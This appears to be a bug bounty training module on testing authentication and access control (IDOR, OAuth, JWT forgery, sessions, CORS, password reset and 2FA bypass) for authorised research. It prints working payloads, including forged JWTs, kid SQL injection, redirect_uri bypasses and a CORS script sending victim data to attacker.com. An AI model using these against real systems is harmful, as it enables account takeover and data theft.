Authentication & Access Control

Bug Hunting • Module 07 • Auth & Access

Authentication and access control vulnerabilities consistently rank among the highest-paying bug classes across every major platform. Broken authentication leads to account takeover. Broken access control leads to data exposure at scale. This module covers IDOR exploitation, OAuth flow abuse, JWT attacks, session management weaknesses, CORS misconfigurations, privilege escalation chains, password reset flaws, and a systematic methodology for testing every layer of the authentication and authorization stack. These are the vulnerability classes that produce four- and five-figure payouts with regularity.

Section 01

IDOR Deep Dive

Insecure Direct Object Reference — IDOR — occurs when an application exposes internal object identifiers (database IDs, filenames, keys) to the user and fails to verify that the requesting user is authorized to access the referenced object. The identifier itself is not the vulnerability. The missing authorization check is. IDOR is classified under OWASP A01:2021 Broken Access Control and is one of the most frequently reported and rewarded vulnerability classes on every major bug bounty platform.

Horizontal vs. Vertical Access

The distinction matters for both exploitation and reporting. Horizontal IDOR means accessing another user's resources at the same privilege level — viewing another customer's invoice, downloading another user's private file, reading another employee's profile data. Vertical IDOR means accessing resources reserved for a higher privilege level — a regular user accessing admin endpoints, a free-tier user accessing premium features, a viewer accessing editor functionality.

↔ Horizontal IDOR

  • Same privilege level, different user's data
  • /api/users/1234/invoices → /api/users/1235/invoices
  • Impact: data exposure, privacy violation
  • Typical severity: Medium to High
  • Escalates to Critical if PII or financial data

↕ Vertical IDOR

  • Accessing higher privilege resources
  • /api/admin/users → accessible by regular user
  • Impact: privilege escalation, admin takeover
  • Typical severity: High to Critical
  • Often chains with other flaws for full compromise

Testing Methodology

Effective IDOR testing requires two authenticated sessions — account A and account B. Every request that includes an identifier should be tested by replaying it from the other account's session. The identifier can appear anywhere: URL path parameters, query strings, POST body fields, JSON payloads, HTTP headers, and cookies.

  • Create two test accounts with different roles if possible. Log both into separate browser profiles or use Burp's session handling rules to swap cookies automatically.
  • Map every endpoint that includes an identifier. Look for numeric IDs, UUIDs, slugs, encoded values, and hashed references. Use Burp Logger or the HTTP history to build a complete list.
  • For numeric IDs, increment and decrement the value. For UUIDs, swap Account A's UUID with Account B's. For encoded values, decode (Base64, URL-encoding, hex), modify, and re-encode.
  • Test parameter pollution: send the same parameter twice with different values (e.g., ?user_id=1234&user_id=1235). Some frameworks take the first value, others take the last, and some concatenate.
  • Check for blind IDOR: the response may not differ visibly, but the server-side action (delete, modify, export) may execute against the wrong object. Verify by checking the victim account.
  • Test across HTTP methods. An endpoint that enforces authorization on GET may not enforce it on PUT, PATCH, or DELETE.

IDOR in Different Contexts

API Endpoints
▼

REST APIs are the most common IDOR surface. The resource ID is typically in the URL path: /api/v1/orders/8847, /api/v1/users/profile/uuid-here. GraphQL APIs are equally vulnerable but the ID appears in the query body rather than the URL. Test every mutation and query that accepts an ID argument.

# REST IDOR test — swap order ID GET /api/v1/orders/8847 HTTP/1.1 Host: target.com Cookie: session=account_A_session # Replay with Account B's session but Account A's order ID GET /api/v1/orders/8847 HTTP/1.1 Host: target.com Cookie: session=account_B_session
File Download Endpoints
▼

File download IDOR is consistently high-impact because it exposes documents, invoices, medical records, or contracts. The identifier may be a filename, a document ID, or a signed URL parameter. Test by replacing the file reference with one belonging to another user. Check for path traversal in addition to IDOR — sometimes the filename parameter accepts ../ sequences.

# File download IDOR GET /api/documents/download?id=doc_a1b2c3 # Replace with another user's document ID GET /api/documents/download?id=doc_x9y8z7 # Path traversal variant GET /api/documents/download?file=../../other_user/report.pdf
POST Body & Header References
▼

Not all IDORs live in the URL. Many applications pass object references in the POST body, especially in JSON APIs. The user_id, account_id, or org_id field in a JSON request body is a prime target. Some applications also read object references from custom HTTP headers such as X-User-Id or X-Account-Id, which may be trusted without validation when they originate from an API gateway or load balancer.

# JSON body IDOR POST /api/settings/update HTTP/1.1 Content-Type: application/json { "user_id": "victim-uuid-here", "email": "attacker@evil.com" } # Header-based IDOR GET /api/dashboard HTTP/1.1 X-Account-Id: victim-account-id

Real-World IDOR Patterns That Pay Well

Pattern Typical Payout Why It Pays
PII Exposure via IDOR $1,000 – $5,000+ Full name, email, phone, address exposed for any user by ID enumeration. Regulatory risk (GDPR, CCPA) drives severity.
Financial Data IDOR $2,000 – $10,000+ Accessing invoices, payment methods, or transaction history of other users. Direct financial impact.

Reporting Tip
When reporting IDOR, always demonstrate the impact with two accounts. Show the exact request from Account B that accesses Account A's data. Include the response body proving data leakage. Describe the population of affected users (all users, all org admins, etc.) and the sensitivity of the exposed data. Impact drives payout.
Section 02

OAuth 2.0 Flows & Flaws

OAuth 2.0 is the de facto authorization framework for third-party access delegation on the web. It allows a user to grant a third-party application limited access to their resources on a service provider without sharing their credentials. Nearly every "Login with Google/GitHub/Facebook" button implements some variant of OAuth 2.0. The protocol is complex, the specification leaves many security decisions to implementers, and the result is a rich attack surface.

Authorization Code Flow

The Authorization Code flow is the most secure and most common OAuth grant type for server-side applications. The sequence begins when the client application redirects the user to the authorization server with a client_id, redirect_uri, response_type=code, scope, and a state parameter. The authorization server authenticates the user, obtains consent, and redirects back to the client's redirect_uri with an authorization code. The client then exchanges this code for an access token via a back-channel POST, authenticating with its client_secret.

# Step 1: Authorization request GET /oauth/authorize? client_id=app_12345 &redirect_uri=https://app.example.com/callback &response_type=code &scope=read:profile &state=random_csrf_token_here # Step 2: Authorization server redirects with code 302 Location: https://app.example.com/callback? code=AUTH_CODE_HERE &state=random_csrf_token_here # Step 3: Client exchanges code for token (back-channel) POST /oauth/token grant_type=authorization_code &code=AUTH_CODE_HERE &client_id=app_12345 &client_secret=SECRET &redirect_uri=https://app.example.com/callback

Implicit Flow (Deprecated)

The Implicit flow was designed for browser-based (SPA) applications that cannot securely store a client_secret. Instead of returning an authorization code, the authorization server returns the access token directly in the URL fragment (#access_token=...). This flow is deprecated because the token is exposed in the browser history, referrer headers, and is vulnerable to token interception. Modern guidance recommends the Authorization Code flow with PKCE for all client types, including SPAs.

PKCE (Proof Key for Code Exchange)

PKCE extends the Authorization Code flow to protect against authorization code interception. The client generates a random code_verifier, derives a code_challenge from it (typically via SHA-256), and includes the challenge in the authorization request. When exchanging the code for a token, the client sends the original code_verifier. The authorization server verifies that it matches the challenge. An attacker who intercepts the authorization code cannot exchange it without the original verifier.

Common OAuth Misconfigurations

↺
Open Redirect in redirect_uri
The authorization server fails to strictly validate the redirect_uri. An attacker modifies it to point to their own server, capturing the authorization code or token. Test with subdomain variations, path traversal, URL-encoded characters, and appending attacker-controlled domains after a valid prefix.
Missing or Predictable state
The state parameter is an anti-CSRF token. If it is missing, empty, or predictable, an attacker can craft a malicious authorization URL and force the victim to link the attacker's account, leading to account takeover via OAuth CSRF.
📡
Token Leakage via Referrer
If the callback page loads external resources (images, scripts, analytics), the access token or authorization code in the URL may leak through the Referer header. This is especially dangerous with the Implicit flow where the token sits in the URL fragment.
Scope Escalation
The client requests a limited scope, but the attacker modifies the scope parameter in the authorization URL to request broader permissions. If the authorization server does not re-prompt the user for the expanded scope, the attacker obtains elevated access silently.

OAuth Token Theft Scenarios

Token theft combines OAuth misconfigurations with other vulnerability classes to extract access tokens. The attacker exploits an open redirect in the redirect_uri to send the authorization code to their server, then exchanges it for an access token. Alternatively, if the target application stores tokens in localStorage and has an XSS vulnerability, the attacker extracts tokens directly from the victim's browser. A third scenario involves a chain: OAuth CSRF (missing state) allows the attacker to link their own OAuth provider account to the victim's application account, then log in as the victim via "Login with Provider."

# redirect_uri manipulation — steal auth code GET /oauth/authorize? client_id=app_12345 &redirect_uri=https://attacker.com/steal &response_type=code &scope=read:profile # Subdomain variation bypass &redirect_uri=https://app.example.com.attacker.com/callback # Path traversal bypass &redirect_uri=https://app.example.com/callback/../../../attacker.com # Double URL-encoding bypass &redirect_uri=https://app.example.com%252f%252fattacker.com
Critical Pattern
Open redirect in redirect_uri combined with a valid OAuth flow is a high-severity finding because it directly leads to token theft. Programs that implement OAuth typically pay $2,000–$10,000+ for this class of bug because it compromises any user who clicks the crafted link.
Section 03

JWT Attacks

JSON Web Tokens (JWTs) are the dominant session token format in modern APIs. A JWT consists of three Base64URL-encoded parts separated by periods: a header, a payload, and a signature. The header declares the algorithm used for signing. The payload contains claims — key-value pairs that convey identity and authorization data (user ID, role, expiration time). The signature ensures integrity: tampering with the header or payload invalidates the signature, and the server rejects the token.

# JWT structure: header.payload.signature eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMTIzNCIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzA5MDAwMDAwfQ.signature_bytes_here # Decoded header: { "alg": "RS256", "typ": "JWT" } # Decoded payload: { "user_id": "1234", "role": "user", "exp": 1709000000 }

The "none" Algorithm Attack

The JWT specification defines an alg value of "none" for unsigned tokens, intended for contexts where integrity is guaranteed by other means (e.g., transport-layer security in trusted environments). If the server's JWT library accepts "none" as a valid algorithm, an attacker can strip the signature, set the algorithm to "none", modify any claims (change role to admin, change user_id to another user), and submit the token with an empty signature. The server verifies the empty signature against the "none" algorithm and accepts it.

# Original JWT header { "alg": "HS256", "typ": "JWT" } # Modified header — "none" algorithm attack { "alg": "none", "typ": "JWT" } # Modified payload — escalate to admin { "user_id": "1234", "role": "admin", "exp": 9999999999 } # Final token: base64(header).base64(payload). (empty signature) eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiMTIzNCIsInJvbGUiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.

Algorithm Confusion (RS256 to HS256)

RS256 uses asymmetric cryptography: the server signs tokens with a private key and verifies them with a public key. HS256 uses symmetric cryptography: the same secret key signs and verifies. In the algorithm confusion attack, the attacker changes the header algorithm from RS256 to HS256 and signs the token using the server's public key (which is publicly available) as the HMAC secret. If the server's JWT library blindly trusts the algorithm in the header, it uses the public key as the HMAC key to verify, and the signature passes validation.

# Step 1: Obtain the server's RSA public key (often at /jwks.json or /.well-known/jwks.json) curl https://target.com/.well-known/jwks.json # Step 2: Convert JWKS to PEM format # Step 3: Change header to HS256 and sign with the public key as HMAC secret python3 jwt_tool.py <token> -X k -pk public_key.pem # The server's verify function sees alg=HS256, uses the "secret" (public key) to verify HMAC # Since we signed with that same public key, the signature matches

JWK Header Injection

The JWT header can include a jwk parameter that embeds the signing key directly in the token. If the server trusts the embedded key without verifying it against a whitelist, the attacker generates their own RSA key pair, signs the token with their private key, and embeds their public key in the jwk header. The server extracts the embedded key and uses it to verify the signature — which naturally passes because the attacker signed with the corresponding private key.

JWKS Spoofing

Some servers fetch the signing key from a URL specified in the jku (JWK Set URL) header parameter. The attacker hosts a malicious JWKS endpoint containing their own public key, modifies the jku header to point to their server, and signs the token with their private key. If the server fetches the JWKS from the attacker-controlled URL without validating the domain, the forged signature verifies successfully.

kid Parameter Injection

The kid (Key ID) header identifies which key in a set should be used for verification. If the server uses the kid value to construct a file path or database query without sanitization, it becomes an injection vector. Path traversal in kid can point the server to a known file (e.g., /dev/null or a public file) and the attacker signs with the contents of that file as the key. SQL injection in kid can extract the signing secret from the database.

# kid path traversal — use /dev/null as the signing key (empty string) { "alg": "HS256", "typ": "JWT", "kid": "../../../../../../dev/null" } # kid SQL injection — force the key lookup to return a known value { "alg": "HS256", "typ": "JWT", "kid": "' UNION SELECT 'known-secret-value' -- " }

JWT Claim Manipulation

Even when the signature cannot be forged, other JWT weaknesses exist. Check whether the server validates the exp (expiration) claim — some implementations accept expired tokens. Test whether the aud (audience) claim is validated — a token issued for one service may be accepted by another. Test whether the iss (issuer) claim is verified. Modify non-critical claims to test for privilege escalation: change "role":"user" to "role":"admin", change "is_admin":false to "is_admin":true, or change "subscription":"free" to "subscription":"enterprise".

Section 04

Session Management Attacks

Session management is the mechanism by which a server tracks the state of an authenticated user across multiple HTTP requests. The session identifier — typically stored in a cookie — is the single credential that represents the user's authenticated state. Any weakness in how sessions are created, transmitted, stored, or invalidated can lead to session hijacking and full account compromise.

Session Fixation

In a session fixation attack, the attacker obtains a valid session identifier from the server (by visiting the login page as an unauthenticated user), then tricks the victim into authenticating with that same session identifier. If the server does not regenerate the session ID upon successful authentication, the attacker's pre-set session ID becomes associated with the victim's authenticated session, granting the attacker full access.

# Step 1: Attacker obtains session ID from the server GET /login HTTP/1.1 # Response: Set-Cookie: SESSIONID=attacker_known_value # Step 2: Attacker sends victim a link with the fixed session https://target.com/login?SESSIONID=attacker_known_value # Step 3: Victim logs in; server does NOT regenerate session ID # Step 4: Attacker uses SESSIONID=attacker_known_value — now authenticated as victim

Session Hijacking via XSS

If session cookies are not protected with the HttpOnly flag, a cross-site scripting vulnerability allows the attacker to extract the session cookie via document.cookie and transmit it to their server. Even with HttpOnly set, an attacker with XSS can perform actions as the victim by making authenticated requests directly from the victim's browser, bypassing the need to steal the cookie.

Cookie Security Flags

Every session cookie should be evaluated against three critical security flags. Missing or misconfigured flags are reportable findings, especially when combined with other weaknesses.

Flag Purpose Attack When Missing
HttpOnly Prevents JavaScript from accessing the cookie via document.cookie XSS allows direct session cookie theft
Secure Cookie is only transmitted over HTTPS, never over plaintext HTTP MITM on HTTP can intercept session cookies in transit
SameSite Controls whether the cookie is sent with cross-origin requests (Strict, Lax, None) CSRF attacks can use the victim's session for state-changing requests

Predictable Session Tokens

Session identifiers must be generated using a cryptographically secure random number generator with sufficient entropy (at least 128 bits). If the session token follows a predictable pattern — sequential integers, timestamps, or weak hashing of predictable inputs — an attacker can compute valid session tokens for other users. Test by collecting multiple session tokens, analyzing them for patterns (Burp Sequencer is purpose-built for this), and checking whether any portion is deterministic.

Session Puzzling

Session puzzling (also called session variable overloading) occurs when the same session variable is used for different purposes across different parts of the application. For example, a password reset flow might store the target user's ID in the session. If the login flow also reads the user ID from the session without clearing it, an attacker can initiate a password reset for the victim, then navigate to the login endpoint to be authenticated as the victim. Test by mapping all session variables across every flow (login, registration, password reset, 2FA) and checking for shared or overloaded variable names.

Concurrent Session Handling

Test what happens when a user logs in from multiple devices simultaneously. Does the server enforce a maximum number of concurrent sessions? When the user changes their password, are existing sessions invalidated? When the user logs out on one device, does it affect sessions on other devices? Failure to invalidate sessions after credential change means a compromised session remains valid indefinitely, even after the user "recovers" their account.

Session Testing Checklist
For every target, verify: (1) Session ID regenerates after login. (2) Session ID regenerates after privilege change. (3) Session invalidates on logout. (4) Session invalidates on password change. (5) Cookie has HttpOnly, Secure, and SameSite flags. (6) Session tokens have sufficient entropy (use Burp Sequencer). (7) Concurrent sessions are controlled. (8) Session timeout is enforced.
Section 05

CORS Exploitation

Cross-Origin Resource Sharing (CORS) is a mechanism that relaxes the Same-Origin Policy (SOP) to allow controlled cross-domain communication. The SOP prevents a script on evil.com from reading the response of a request to bank.com. CORS headers tell the browser which origins are allowed to read responses. When CORS is misconfigured, an attacker's website can make authenticated requests to the target and read the responses, exfiltrating sensitive data.

Same-Origin Policy Basics

Two URLs have the same origin if they share the same scheme (http/https), host, and port. The SOP restricts how a document or script loaded from one origin can interact with resources from another origin. JavaScript on https://evil.com can send a cross-origin request to https://api.target.com, but the browser blocks the script from reading the response unless the response includes permissive CORS headers.

CORS Header Analysis

The key headers to examine are Access-Control-Allow-Origin (which origins can read the response), Access-Control-Allow-Credentials (whether cookies are included), and Access-Control-Allow-Methods (which HTTP methods are permitted). The vulnerability arises when the server reflects a controlled origin and allows credentials simultaneously.

# Test: Send a request with an arbitrary Origin header curl -H "Origin: https://evil.com" -I https://api.target.com/user/profile # Check the response headers: Access-Control-Allow-Origin: https://evil.com # Reflected! Vulnerable. Access-Control-Allow-Credentials: true # Cookies sent. Critical. # Safe response would be: Access-Control-Allow-Origin: https://app.target.com # Hardcoded whitelist.

Exploitable CORS Misconfigurations

Misconfiguration Severity How to Test
Reflect Origin Critical Send Origin: https://evil.com. If ACAO reflects it and ACAC is true, any attacker site can read authenticated responses.
null Origin High Send Origin: null. Sandboxed iframes and data: URIs send a null origin. If ACAO reflects null with credentials, exploit via a sandboxed iframe.
Wildcard + Credentials Medium ACAO is * and ACAC is true. Browsers reject this combination, but some custom HTTP clients and mobile apps do not. Test non-browser clients.
Regex Bypass High Send Origin: https://target.com.evil.com or Origin: https://eviltarget.com. Weak regex that checks if the origin "contains" or "ends with" the trusted domain will match.

CORS Exploitation PoC Script

When you confirm a reflective CORS misconfiguration with credentials, the PoC is a simple HTML page hosted on the attacker's domain that makes an authenticated request and reads the response.

<!-- CORS exploitation PoC — host on attacker.com --> <script> var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://api.target.com/user/profile', true); xhr.withCredentials = true; xhr.onreadystatechange = function() { if (xhr.readyState === 4) { // Send stolen data to attacker's server var exfil = new XMLHttpRequest(); exfil.open('POST', 'https://attacker.com/log', true); exfil.send(xhr.responseText); } }; xhr.send(); </script>

Real-World CORS Bounties

CORS misconfigurations that reflect arbitrary origins with credentials and expose sensitive data (PII, tokens, financial data) typically pay $1,000–$5,000 on major platforms. The payout depends on the sensitivity of the data accessible via the misconfigured endpoint. A CORS misconfiguration on a marketing page that returns no sensitive data is informational. The same misconfiguration on /api/user/profile that returns email, name, and API keys is high-severity. Always demonstrate the impact by showing the exact data an attacker can exfiltrate.

Testing Shortcut
Use Burp's "Add custom header" match/replace rule to add Origin: https://evil.com to every request automatically. Then review all responses for reflected ACAO headers with credentials. This turns CORS testing from a manual hunt into passive discovery.
Section 06

⚓ Privilege Escalation Patterns

Privilege escalation in web applications occurs when a user gains access to resources or functionality beyond their intended authorization level. This is distinct from authentication bypass (where the attacker is not authenticated at all) — privilege escalation assumes the attacker has a valid, authenticated session but abuses flaws in the authorization layer to expand their permissions.

Horizontal Privilege Escalation

Horizontal escalation means accessing another user's resources at the same privilege level. This overlaps significantly with IDOR but extends beyond simple object references. Horizontal escalation includes accessing another user's dashboard by modifying a cookie value, viewing another team's project by changing a workspace ID in the session, or reading another customer's support tickets by manipulating API query filters.

Vertical Privilege Escalation

Vertical escalation means gaining a higher privilege level than assigned — a regular user performing admin actions, a read-only user gaining write access, or a free-tier user accessing enterprise features. Vertical escalation is consistently rated high to critical severity because it compromises the entire authorization model.

Missing Function-Level Access Control

This vulnerability occurs when the application enforces access control in the UI (hiding buttons, removing menu items) but not on the server. The admin panel button is hidden from regular users, but navigating directly to /admin/dashboard works. The "delete user" button is absent from the regular user's interface, but sending a DELETE /api/users/1234 request succeeds because the endpoint lacks an authorization check.

  • Enumerate all endpoints by reviewing JavaScript source files, API documentation, and Swagger/OpenAPI definitions. Build a complete map of every endpoint the application exposes.
  • Test every endpoint with sessions at each privilege level: unauthenticated, regular user, moderator, admin. Record which requests succeed and which return 401/403.
  • Pay special attention to endpoints that perform destructive or administrative actions: user management, configuration changes, data export, billing modifications, and audit log access.
  • Test HTTP method variations. An endpoint may enforce authorization on POST but not on PUT, PATCH, or OPTIONS. Some frameworks have different middleware chains for different methods.
  • Check for parameter-based role elevation: adding &admin=true, &role=admin, or {"is_admin": true} to requests. Some applications trust client-supplied role indicators.

Forced Browsing to Admin Endpoints

Forced browsing means directly requesting URLs that are not linked in the application's UI but exist on the server. Common admin paths include /admin, /console, /management, /internal, /debug, /api/admin, and /graphql (with introspection enabled). Tools like ffuf, feroxbuster, and gobuster with admin-focused wordlists are effective for discovering these endpoints.

# Forced browsing with ffuf — discover admin endpoints ffuf -u https://target.com/FUZZ \ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \ -H "Cookie: session=regular_user_session" \ -mc 200,301,302,403 \ -fc 404 # Check API versioning — older API versions may lack auth curl https://api.target.com/v1/admin/users # v2 enforces auth, v1 does not

Role Manipulation in Requests

Some applications include role or permission data in the request itself — in cookies, JWT claims, hidden form fields, or API parameters. If the server trusts these client-supplied values without server-side validation, the attacker can elevate their privileges by modifying them. Test by intercepting registration and profile update requests and adding role-related fields. Test by decoding JWT tokens and modifying role claims (covered in Section 03). Test by modifying cookie values that contain role identifiers (e.g., role=user to role=admin).

Multi-Step Privilege Escalation Chains

The highest-impact findings often involve chaining multiple lower-severity issues into a privilege escalation chain. A self-XSS (normally out of scope) combined with a CSRF that forces the victim to trigger the XSS, which then steals an admin's session token, which grants admin access — that chain is critical. An IDOR that reveals an admin's email, combined with a password reset flaw that allows resetting any account by email, combined with a 2FA bypass — each step escalates the impact.

Information Disclosure → IDOR
An endpoint leaks user IDs or UUIDs. Another endpoint has an IDOR that accepts those IDs. The information disclosure enables mass exploitation of the IDOR.
IDOR → Account Takeover
An IDOR in the email update endpoint allows changing another user's email. The attacker changes the victim's email to their own, then uses password reset to gain full access.
XSS → Session Theft → Admin
A stored XSS in a support ticket is viewed by an admin. The XSS steals the admin's session cookie. The attacker uses the admin session to access admin functionality.
CORS → Token Theft → Escalation
A CORS misconfiguration allows reading API responses cross-origin. The attacker's page reads the victim's API key from the profile endpoint, then uses the API key for unauthorized actions.
Chaining Increases Payouts
Programs consistently pay more for demonstrated chains than for individual low-severity findings. A single IDOR that exposes a user's display name might be a $100 finding. That same IDOR chained to account takeover is a $5,000+ finding. Always explore what you can chain before submitting.
Section 07

Password Reset & Account Takeover

Password reset flows are one of the most productive attack surfaces for account takeover in bug bounty. The reset flow must generate a token, deliver it to the legitimate user, and verify it upon return — each step introduces potential weaknesses. Account takeover (ATO) is the ultimate goal: gaining persistent access to another user's account. ATO findings consistently receive the highest severity ratings and payouts.

Password Reset Token Prediction

The reset token must be cryptographically random and sufficiently long. If the token is derived from predictable values — a timestamp, the user's email address, a sequential counter, or a weak hash of these inputs — the attacker can compute valid tokens without access to the victim's email. Test by requesting multiple reset tokens and analyzing them for patterns. Check if the token is a Base64-encoded timestamp, a UUID v1 (which contains a timestamp component), or a short numeric code vulnerable to brute-force.

# Collect multiple reset tokens and analyze Token 1: MTcwOTAwMDAwMC0xMjM0 # Base64 decode: 1709000000-1234 Token 2: MTcwOTAwMDA2MC0xMjM1 # Base64 decode: 1709000060-1235 # Pattern: Unix timestamp + sequential user ID # Attacker can predict token for any user if they know the user ID and request time # Short numeric code brute-force ffuf -u https://target.com/reset?token=FUZZ \ -w /path/to/6digit-codes.txt \ -mc 200 -fr "invalid"

Host Header Injection in Reset Emails

When an application generates a password reset link, it constructs the URL using the Host header from the request. If the application does not validate the Host header, an attacker can trigger a password reset for the victim and inject a malicious Host header pointing to their own server. The reset email sent to the victim contains a link to the attacker's domain with the valid reset token. When the victim clicks the link (or when email security scanners pre-fetch it), the attacker captures the token.

# Host header injection in password reset POST /forgot-password HTTP/1.1 Host: attacker.com Content-Type: application/x-www-form-urlencoded email=victim@target.com # Victim receives email with link: # https://attacker.com/reset?token=VALID_TOKEN # Alternative: X-Forwarded-Host header POST /forgot-password HTTP/1.1 Host: target.com X-Forwarded-Host: attacker.com # Some applications prefer X-Forwarded-Host over Host for link generation

Response Manipulation

Some applications implement password reset verification on the client side. The server returns a JSON response with a status field, and the client JavaScript decides whether to display the "set new password" form based on the status value. An attacker can intercept the response in Burp and change {"status":"invalid"} to {"status":"valid"} to bypass token verification. While the server should still enforce the token on the final password change request, many applications do not re-verify at that stage.

Race Conditions in Verification

Race conditions in password reset flows arise when the server does not properly serialize token validation and password update operations. An attacker sends multiple simultaneous requests to the password change endpoint with the same reset token. If the server checks "is this token valid?" and "invalidate this token" as separate operations without proper locking, multiple requests may pass the validation check before any of them invalidate the token. This can allow reuse of a single-use token.

# Race condition — send multiple simultaneous requests with the same token # Using Burp Turbo Intruder or parallel curl for i in $(seq 1 50); do curl -X POST https://target.com/reset-password \ -d "token=RESET_TOKEN&new_password=hacked123" & done wait # If multiple requests succeed with the same token, the server has a TOCTOU race condition

Account Takeover Chains

Account takeover is rarely a single-step vulnerability. It is typically a chain of two or three findings that, together, grant persistent access to the victim's account. The most common chains involve:

  • IDOR in email change + password reset = full ATO (change the victim's email to yours, then reset the password)
  • Host header poisoning + social engineering = token capture (victim clicks the poisoned reset link)
  • OAuth misconfiguration + account linking = silent ATO (link attacker's OAuth account to victim's profile)
  • Subdomain takeover + cookie scope = session theft (claim an abandoned subdomain, receive cookies scoped to the parent domain)
  • XSS + password change without current password = silent ATO (XSS payload changes the password directly)

2FA Bypass Techniques

Two-factor authentication adds a second layer of security, but its implementation often contains bypassable weaknesses. These are not attacks on the cryptographic mechanisms themselves but on the implementation logic.

Response Manipulation
▼

The server returns a status code or JSON field indicating whether the 2FA code is correct. Intercepting and modifying the response from {"success": false} to {"success": true} or changing a 403 status to 200 may bypass the check if the client trusts the response status and proceeds to the authenticated state.

Backup Code Brute-Force
▼

Backup codes are typically 8-character alphanumeric strings, but some applications use shorter numeric codes. If the application does not rate-limit backup code attempts or lock the account after failed tries, brute-force is feasible for shorter codes. Test with Burp Intruder or Turbo Intruder to determine the rate limit threshold.

Direct Navigation Bypass
▼

After entering the username and password, the application redirects to a 2FA verification page. However, if the authenticated session is already created at the password stage (before 2FA verification), directly navigating to the dashboard URL bypasses the 2FA step entirely. The session is valid; the 2FA page is just a client-side gate.

SMS Interception Concepts
▼

SMS-based 2FA is considered the weakest form because of SIM swapping attacks, SS7 protocol vulnerabilities, and malicious mobile apps that read incoming SMS. While exploiting these in a bug bounty context is out of scope (you cannot SIM swap someone), understanding the weakness informs your reporting: recommending TOTP or hardware keys over SMS is a valid security improvement suggestion.

Ethical Boundary
Account takeover testing must be performed exclusively against accounts you control. Never attempt to access, modify, or compromise another real user's account. Create two test accounts and demonstrate the vulnerability using only your own accounts. Programs will disqualify and ban researchers who access real user data.
Section 08

Testing Methodology for Auth

Systematic testing separates productive researchers from those who find one bug per month by accident. Authentication and authorization testing requires multiple accounts, methodical endpoint coverage, and tooling that automates the repetitive comparison work. This section provides the operational checklist, introduces the key tools, and covers how to report access control vulnerabilities with maximum impact.

Systematic Auth Testing Checklist

  • Account setup. Create at least three accounts: a regular user (Account A), a second regular user (Account B), and an admin or higher-privileged user (Account C) if possible. Log each into a separate browser profile.
  • Endpoint mapping. Crawl the application with each account level. Review JavaScript source files for API paths. Check for Swagger/OpenAPI docs at /api-docs, /swagger.json, /openapi.json. Build a matrix of all endpoints.
  • Authorization matrix. For every endpoint, record the expected authorization behavior (which roles should have access) and the actual behavior when accessed with each account's session. Flag any discrepancies.
  • IDOR sweep. For every endpoint that accepts an identifier, replay the request from Account B using Account A's identifier. Test with Account C's identifiers from Account A's session for vertical escalation.
  • Method variation. For every endpoint tested, also test with alternate HTTP methods (GET, POST, PUT, PATCH, DELETE, OPTIONS). Some endpoints enforce auth on one method but not others.
  • Session validation. Test session regeneration on login, session invalidation on logout, session invalidation on password change, cookie flags, session timeout, and concurrent session behavior.
  • Token analysis. If the application uses JWTs, test for none algorithm, algorithm confusion, claim manipulation, and expiration enforcement. If it uses opaque session tokens, run Burp Sequencer to test randomness.
  • OAuth review. If the application supports OAuth login, test redirect_uri validation, state parameter presence and unpredictability, scope enforcement, and token storage practices.
  • Password reset flow. Test token predictability, host header injection, rate limiting on verification codes, token expiration, and single-use enforcement.
  • CORS check. Send requests with Origin: https://evil.com and Origin: null to every authenticated endpoint. Check for reflected origins with Access-Control-Allow-Credentials: true.

Tools

Autorize
Burp Extension — Automatic Auth Testing
Autorize is a Burp extension that automatically replays every request with a different user's session cookies. Configure it with Account B's cookies and browse the application as Account A. Autorize shows, for each request, whether Account B received the same response (authorization bypass) or a 401/403 (enforced). It color-codes results for quick triage: green for enforced, red for bypassed.
AuthMatrix
Burp Extension — Access Matrix
AuthMatrix allows you to define multiple users and roles, then build an access control matrix for selected requests. You mark which user-role combinations should succeed or fail for each endpoint, then run the test. AuthMatrix replays every request with every user's session and highlights violations against your expected matrix. Best for applications with complex role hierarchies.
jwt_tool
CLI — JWT Attack Suite
Comprehensive JWT testing tool. Use -M at to run all known attack techniques automatically against a target. Supports none algorithm, key confusion, JWK/JWKS injection, kid injection, claim tampering, and HMAC brute-force. Essential for any application that uses JWT-based authentication.
Burp Sequencer
Burp Suite — Token Analysis
Analyzes the randomness quality of session tokens, CSRF tokens, and any other generated values. Feed it the token-generating request and it collects thousands of samples, running statistical tests (FIPS, chi-squared, bit-level analysis) to detect patterns or insufficient entropy.
ffuf / feroxbuster
CLI — Content Discovery
Fast web fuzzers for discovering hidden endpoints, admin panels, and API paths that are not linked in the application UI. Use with auth-focused wordlists from SecLists. Run with an authenticated session cookie to discover endpoints that return different responses for authenticated vs. unauthenticated users.
Burp Match/Replace
Burp Suite — Header Injection
Use Burp's match/replace rules to automatically add Origin headers for CORS testing, modify Host headers for host header injection tests, or swap session cookies between users. Automates repetitive header manipulation across all proxied traffic.

Automating Auth Testing

Manual testing catches the nuanced bugs, but automation catches the obvious ones at scale. The workflow combines automated tools with manual review:

  • Enable Autorize with Account B's cookies and browse the entire application as Account A. Review the Autorize log for any green (bypassed) endpoints.
  • Run a content discovery scan with an authenticated session to find hidden endpoints. Test each discovered endpoint with Autorize.
  • Export the list of all unique endpoints from Burp's sitemap. Write a script that replays each request with unauthenticated, regular user, and admin sessions, comparing response codes and body lengths.
  • For JWT-based applications, run jwt_tool -M at against the target to automatically test all known JWT attack variants.
  • For CORS, use a Burp match/replace rule to add the Origin header and passively monitor for reflected origins during normal testing.

Reporting Access Control Vulnerabilities with Impact

Access control reports must demonstrate clear impact to receive appropriate severity ratings and payouts. The structure of an effective report follows a consistent pattern:

Strong Report

  • Clear title: "IDOR in /api/invoices allows any user to access all invoices"
  • Step-by-step reproduction with exact requests and responses
  • Two-account proof showing Account B accessing Account A's data
  • Sensitive data visible in the response body (redact PII in screenshots)
  • Impact statement: "All 50,000+ users' invoices containing PII are accessible"
  • Remediation: "Verify requesting user owns the invoice before returning data"

Weak Report

  • Vague title: "Access control issue found"
  • Missing exact request/response evidence
  • Single-account test without proving cross-user access
  • No demonstration of sensitive data exposure
  • No scale or population impact described
  • No remediation guidance
Maximize Your Payout
